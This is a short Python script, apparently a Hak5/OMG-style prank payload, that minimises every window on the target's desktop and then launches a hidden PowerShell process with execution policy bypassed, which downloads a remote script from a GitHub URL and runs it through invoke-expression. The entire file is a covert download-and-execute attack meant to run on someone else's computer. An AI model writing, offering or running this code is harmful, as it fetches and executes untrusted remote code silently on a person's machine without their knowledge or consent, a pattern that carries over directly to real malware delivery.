import pyautogui
import time
import os

# Start by minimizing all their current windows
pyautogui.hotkey('win', 'm')
time.sleep(0.5)

# Run PowerShell command
os.system('powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/I-Am-Jakoby/hak5-submissions/main/OMG/Payloads/OMG-JumpScare/JumpScare.ps1?dl=1; invoke-expression $pl')
